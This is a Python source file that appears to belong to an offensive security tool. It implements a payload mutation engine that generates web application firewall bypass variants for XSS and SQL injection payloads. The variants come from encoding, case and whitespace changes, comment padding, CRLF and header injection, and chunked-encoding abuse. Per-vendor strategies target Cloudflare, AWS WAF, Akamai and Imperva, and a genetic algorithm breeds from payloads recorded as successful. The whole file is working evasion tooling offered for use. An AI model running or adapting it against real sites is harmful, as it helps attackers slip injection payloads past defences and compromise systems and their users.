"""
Payload Mutation Engine
=======================
Generates WAF bypass variants using encoding, structural mutations, and genetic algorithms.

Mutation Strategies:
1. Encoding: URL, hex, unicode, base64, double encoding
2. Case: Mixed case, alternating case, random case
3. Whitespace: Space/tab/newline injection, comment padding
4. Comment: SQL comments, HTML comments, JS comments
5. Protocol: Request smuggling, header injection
6. Genetic: Breed successful payloads, crossover + mutation

WAF-Specific:
- Cloudflare: Focus on unicode, double encoding, case mutations
- AWS WAF: Protocol smuggling, header injection
- Akamai: Whitespace injection, comment obfuscation
- Imperva: Genetic algorithm, novel pattern generation
"""

from __future__ import annotations

import base64
import hashlib
import logging
import random
import re
import urllib.parse
from dataclasses import dataclass
from typing import Dict, List, Optional, Set, Tuple

log = logging.getLogger(__name__)

# ── Rust fast-path shim ───────────────────────────────────────────────────────
_RUST_PAYLOAD_ENABLED = False
try:
    import os as _os
    if _os.environ.get('ONEINFINITY_RUST', '') not in ('', '0', 'false'):
        from oneinfinity_core import (  # type: ignore[import]
            mutate as _rs_mutate,
            generate_waf_bypass as _rs_generate_waf_bypass,
            encode_payload as _rs_encode_payload,
        )
        _RUST_PAYLOAD_ENABLED = True
except ImportError:
    pass
# ── End Rust shim ─────────────────────────────────────────────────────────────


@dataclass
class MutatedPayload:
    """Mutated payload with metadata."""
    content: str
    strategy: str  # encoding, case, whitespace, comment, protocol, genetic
    parent: Optional[str] = None  # Original payload
    generation: int = 1  # For genetic algorithm tracking
    fitness: float = 0.0  # Success rate (0-1)
    waf_bypassed: Optional[str] = None  # WAF vendor if known


class MutationEngine:
    """
    Payload mutation engine for WAF bypass.

    Generates variants using multiple strategies:
    - Encoding transformations (URL, hex, unicode, base64)
    - Structural mutations (case, whitespace, comments)
    - Protocol-level mutations (smuggling, header injection)
    - Genetic algorithm (breed successful payloads)

    Usage:
        engine = MutationEngine()
        mutations = engine.mutate(
            payload="<script>alert(1)</script>",
            waf_vendor="cloudflare",
            blocked_patterns=["<script>", "alert"]
        )
    """

    # WAF-specific mutation preferences
    WAF_STRATEGIES = {
        "cloudflare": ["unicode", "double_encoding", "case"],
        "aws": ["protocol", "header_injection", "encoding"],
        "akamai": ["whitespace", "comment", "case"],
        "imperva": ["genetic", "encoding", "whitespace"],
        "generic_waf": ["encoding", "case", "whitespace", "comment"],
    }

    def __init__(self, max_mutations: int = 50):
        """
        Initialize mutation engine.

        Args:
            max_mutations: Maximum mutations to generate per payload
        """
        self.max_mutations = max_mutations
        self.successful_mutations: Dict[str, List[str]] = {}  # vuln_type → [payloads]
        self.mutation_history: List[MutatedPayload] = []

    def mutate(
        self,
        payload: str,
        waf_vendor: Optional[str] = None,
        blocked_patterns: Optional[List[str]] = None,
        vuln_type: str = "xss"
    ) -> List[MutatedPayload]:
        """
        Generate mutations for payload.

        Args:
            payload: Original payload to mutate
            waf_vendor: Detected WAF (e.g., "cloudflare", "aws")
            blocked_patterns: Patterns that triggered WAF block
            vuln_type: Vulnerability type (xss, sqli, ssti, etc.)

        Returns:
            List of mutated payloads
        """
        mutations = []
        blocked = set(blocked_patterns or [])

        # Get WAF-specific strategies
        strategies = self.WAF_STRATEGIES.get(
            waf_vendor or "generic_waf",
            ["encoding", "case", "whitespace", "comment"]
        )

        log.info(f"Mutating payload (WAF={waf_vendor}, strategies={strategies})")

        # Apply each strategy
        for strategy in strategies:
            if strategy == "encoding" or strategy == "double_encoding":
                mutations.extend(self._encoding_mutations(payload, double=strategy == "double_encoding"))
            elif strategy == "unicode":
                mutations.extend(self._unicode_mutations(payload))
            elif strategy == "case":
                mutations.extend(self._case_mutations(payload))
            elif strategy == "whitespace":
                mutations.extend(self._whitespace_injection(payload, vuln_type))
            elif strategy == "comment":
                mutations.extend(self._comment_injection(payload, vuln_type))
            elif strategy == "protocol":
                mutations.extend(self._protocol_smuggling(payload))
            elif strategy == "genetic" and self.successful_mutations.get(vuln_type):
                mutations.extend(self._genetic_breed(payload, vuln_type))

            # Stop if we have enough mutations
            if len(mutations) >= self.max_mutations:
                break

        # Filter out mutations that still contain blocked patterns
        filtered = []
        for mut in mutations:
            if not self._contains_blocked_pattern(mut.content, blocked):
                filtered.append(mut)

        log.info(f"Generated {len(filtered)} mutations (filtered from {len(mutations)})")

        self.mutation_history.extend(filtered[:self.max_mutations])
        return filtered[:self.max_mutations]

    # ── Encoding Mutations ────────────────────────────────────────────────────

    def _encoding_mutations(self, payload: str, double: bool = False) -> List[MutatedPayload]:
        """Generate encoding mutations (URL, hex, base64, unicode)."""
        mutations = []

        # URL encoding
        url_encoded = urllib.parse.quote(payload)
        mutations.append(MutatedPayload(
            content=url_encoded,
            strategy="url_encoding",
            parent=payload
        ))

        # Double URL encoding
        if double:
            double_encoded = urllib.parse.quote(url_encoded)
            mutations.append(MutatedPayload(
                content=double_encoded,
                strategy="double_url_encoding",
                parent=payload
            ))

        # Hex encoding
        hex_encoded = "".join(f"%{ord(c):02x}" for c in payload)
        mutations.append(MutatedPayload(
            content=hex_encoded,
            strategy="hex_encoding",
            parent=payload
        ))

        # Base64 encoding (useful for some contexts)
        try:
            b64_encoded = base64.b64encode(payload.encode()).decode()
            mutations.append(MutatedPayload(
                content=b64_encoded,
                strategy="base64_encoding",
                parent=payload
            ))
        except Exception:
            pass

        return mutations

    def _unicode_mutations(self, payload: str) -> List[MutatedPayload]:
        """Generate unicode escape mutations."""
        mutations = []

        # Unicode escape (\uXXXX)
        unicode_escaped = "".join(f"\\u{ord(c):04x}" for c in payload)
        mutations.append(MutatedPayload(
            content=unicode_escaped,
            strategy="unicode_escape",
            parent=payload
        ))

        # HTML entity encoding
        html_entities = "".join(f"&#{ord(c)};" for c in payload)
        mutations.append(MutatedPayload(
            content=html_entities,
            strategy="html_entities",
            parent=payload
        ))

        # Mixed unicode/normal (50/50 split)
        mixed = ""
        for c in payload:
            if random.random() < 0.5:
                mixed += f"\\u{ord(c):04x}"
            else:
                mixed += c
        mutations.append(MutatedPayload(
            content=mixed,
            strategy="mixed_unicode",
            parent=payload
        ))

        return mutations

    # ── Case Mutations ────────────────────────────────────────────────────────

    def _case_mutations(self, payload: str) -> List[MutatedPayload]:
        """Generate case variation mutations."""
        mutations = []

        # Uppercase
        mutations.append(MutatedPayload(
            content=payload.upper(),
            strategy="uppercase",
            parent=payload
        ))

        # Lowercase
        mutations.append(MutatedPayload(
            content=payload.lower(),
            strategy="lowercase",
            parent=payload
        ))

        # Alternating case (aLtErNaTiNg)
        alternating = "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )
        mutations.append(MutatedPayload(
            content=alternating,
            strategy="alternating_case",
            parent=payload
        ))

        # Random case
        random_case = "".join(
            c.upper() if random.random() < 0.5 else c.lower()
            for c in payload
        )
        mutations.append(MutatedPayload(
            content=random_case,
            strategy="random_case",
            parent=payload
        ))

        # Title case (First Letter)
        mutations.append(MutatedPayload(
            content=payload.title(),
            strategy="title_case",
            parent=payload
        ))

        return mutations

    # ── Whitespace Injection ──────────────────────────────────────────────────

    def _whitespace_injection(self, payload: str, vuln_type: str) -> List[MutatedPayload]:
        """Inject whitespace/tabs/newlines to evade pattern matching."""
        mutations = []

        # Space padding
        spaced = " ".join(payload)
        mutations.append(MutatedPayload(
            content=spaced,
            strategy="space_padding",
            parent=payload
        ))

        # Tab injection
        tabbed = payload.replace(" ", "\t")
        mutations.append(MutatedPayload(
            content=tabbed,
            strategy="tab_injection",
            parent=payload
        ))

        # Newline injection (for SQL)
        if vuln_type == "sqli":
            newlined = payload.replace(" ", "\n")
            mutations.append(MutatedPayload(
                content=newlined,
                strategy="newline_injection",
                parent=payload
            ))

        # Random whitespace mix
        ws_chars = [" ", "\t", "\n", "\r"]
        ws_mixed = ""
        for c in payload:
            if c == " ":
                ws_mixed += random.choice(ws_chars)
            else:
                ws_mixed += c
        mutations.append(MutatedPayload(
            content=ws_mixed,
            strategy="random_whitespace",
            parent=payload
        ))

        return mutations

    # ── Comment Injection ─────────────────────────────────────────────────────

    def _comment_injection(self, payload: str, vuln_type: str) -> List[MutatedPayload]:
        """Inject comments to break up patterns."""
        mutations = []

        if vuln_type == "sqli":
            # SQL inline comments
            commented = re.sub(r"\s+", "/**/", payload)
            mutations.append(MutatedPayload(
                content=commented,
                strategy="sql_inline_comments",
                parent=payload
            ))

            # SQL line comments
            line_commented = payload.replace(" ", "--\n")
            mutations.append(MutatedPayload(
                content=line_commented,
                strategy="sql_line_comments",
                parent=payload
            ))

        elif vuln_type == "xss":
            # HTML comments
            html_commented = f"<!--{payload}-->"
            mutations.append(MutatedPayload(
                content=html_commented,
                strategy="html_comments",
                parent=payload
            ))

            # JS multi-line comments
            js_commented = f"/*{payload}*/"
            mutations.append(MutatedPayload(
                content=js_commented,
                strategy="js_comments",
                parent=payload
            ))

        return mutations

    # ── Protocol Smuggling ────────────────────────────────────────────────────

    def _protocol_smuggling(self, payload: str) -> List[MutatedPayload]:
        """Generate HTTP request smuggling variants."""
        mutations = []

        # CRLF injection
        crlf = payload + "\r\n\r\n"
        mutations.append(MutatedPayload(
            content=crlf,
            strategy="crlf_injection",
            parent=payload
        ))

        # Header injection
        header_injected = payload + "\r\nX-Injected: true"
        mutations.append(MutatedPayload(
            content=header_injected,
            strategy="header_injection",
            parent=payload
        ))

        # Chunked encoding abuse
        chunked = f"{len(payload):x}\r\n{payload}\r\n0\r\n\r\n"
        mutations.append(MutatedPayload(
            content=chunked,
            strategy="chunked_encoding",
            parent=payload
        ))

        return mutations

    # ── Genetic Algorithm ─────────────────────────────────────────────────────

    def _genetic_breed(self, payload: str, vuln_type: str) -> List[MutatedPayload]:
        """Breed payload with successful mutations using genetic algorithm."""
        mutations = []
        successful = self.successful_mutations.get(vuln_type, [])

        if not successful:
            return mutations

        # Crossover: combine parts of payload with successful mutations
        for parent in random.sample(successful, min(3, len(successful))):
            # Single-point crossover
            if len(payload) > 3 and len(parent) > 3:
                cut_point = random.randint(1, min(len(payload), len(parent)) - 1)
                offspring = payload[:cut_point] + parent[cut_point:]
                mutations.append(MutatedPayload(
                    content=offspring,
                    strategy="genetic_crossover",
                    parent=payload,
                    generation=2
                ))

            # Two-point crossover
            if len(payload) > 5 and len(parent) > 5:
                cut1 = random.randint(1, min(len(payload), len(parent)) - 2)
                cut2 = random.randint(cut1 + 1, min(len(payload), len(parent)) - 1)
                offspring = payload[:cut1] + parent[cut1:cut2] + payload[cut2:]
                mutations.append(MutatedPayload(
                    content=offspring,
                    strategy="genetic_two_point",
                    parent=payload,
                    generation=2
                ))

        # Mutation: random character changes
        for _ in range(3):
            mutated = list(payload)
            if len(mutated) > 2:
                idx = random.randint(0, len(mutated) - 1)
                mutated[idx] = chr((ord(mutated[idx]) + random.randint(1, 25)) % 128)
                mutations.append(MutatedPayload(
                    content="".join(mutated),
                    strategy="genetic_mutation",
                    parent=payload,
                    generation=2
                ))

        return mutations

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _contains_blocked_pattern(self, payload: str, blocked: Set[str]) -> bool:
        """Check if payload contains any blocked patterns."""
        payload_lower = payload.lower()
        for pattern in blocked:
            if pattern.lower() in payload_lower:
                return True
        return False

    def record_success(self, payload: str, vuln_type: str, waf: Optional[str] = None):
        """Record successful payload for genetic algorithm."""
        if vuln_type not in self.successful_mutations:
            self.successful_mutations[vuln_type] = []

        self.successful_mutations[vuln_type].append(payload)

        # Keep only last 50 successful payloads per type
        if len(self.successful_mutations[vuln_type]) > 50:
            self.successful_mutations[vuln_type] = self.successful_mutations[vuln_type][-50:]

        log.info(f"Recorded successful payload for {vuln_type} (WAF={waf})")

    def get_stats(self) -> Dict:
        """Get mutation engine statistics."""
        strategy_counts = {}
        for mut in self.mutation_history:
            strategy_counts[mut.strategy] = strategy_counts.get(mut.strategy, 0) + 1

        return {
            "total_mutations": len(self.mutation_history),
            "successful_payloads": sum(len(v) for v in self.successful_mutations.values()),
            "strategy_distribution": strategy_counts,
            "vuln_types_learned": list(self.successful_mutations.keys())
        }


# ── Singleton ─────────────────────────────────────────────────────────────────

_engine_instance: Optional[MutationEngine] = None


def get_mutation_engine() -> MutationEngine:
    """Get singleton mutation engine instance."""
    global _engine_instance
    if _engine_instance is None:
        _engine_instance = MutationEngine()
    return _engine_instance
